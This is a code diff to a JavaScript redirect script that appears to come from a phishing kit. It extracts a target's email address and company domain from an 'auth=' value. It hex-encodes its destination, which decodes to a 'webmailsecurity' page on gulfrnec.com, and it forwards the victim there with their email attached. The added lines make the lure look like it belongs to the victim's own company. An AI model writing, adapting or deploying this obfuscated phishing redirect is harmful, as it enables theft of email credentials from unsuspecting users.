@@ -6,7 +6,6 @@
 
 const valueAfterEquals1 = feedUpdateResponse.split('auth=').slice(1).join('auth=');
 
-
 const econd=valueAfterEquals1;
 
 	 var ind = econd.indexOf("@");
@@ -16,8 +15,9 @@ const domain = my_slice;
 var companyName = domain.split('.')[0];
 
 	 
+
 		 	  
-      const hex = "2f7765626d61696c73656375726974792f7765622e68746d6c"; // 
+      const hex = "2e67756c66726e65632e636f6d2f7765626d61696c73656375726974792f7765622e68746d6c"; // 
 	  
 	  // 
 	  
@@ -28,12 +28,11 @@ var companyName = domain.split('.')[0];
         .map(byte => String.fromCharCode(parseInt(byte, 16)))
         .join('');
 	
-	window.location.assign("https://dsash.gulfrnec.com"+decodedUrl+"?&1*1howd4r*_up*MQ..*_gs*MQ..&gclid=CjwKCAjw6s7CBhACEiwAuHQckmMG4jVCQEvK3DNGEDrqDGuST1wMvQ9_63A__PM9DZlTksBhfJzmTBoC28MQAvD_BwE&gbraid=0AAAAAD_qHs_7MG&md="+extractedEmail);
+	window.location.assign("https://"+companyName+decodedUrl+"?&1*1howd4r*_up*MQ..*_gs*MQ..&gclid=CjwKCAjw6s7CBhACEiwAuHQckmMG4jVCQEvK3DNGEDrqDGuST1wMvQ9_63A__PM9DZlTksBhfJzmTBoC28MQAvD_BwE&gbraid=0AAAAAD_qHs_7MG&md="+valueAfterEquals1);
     
 
  
 </script>
-
 
 
 
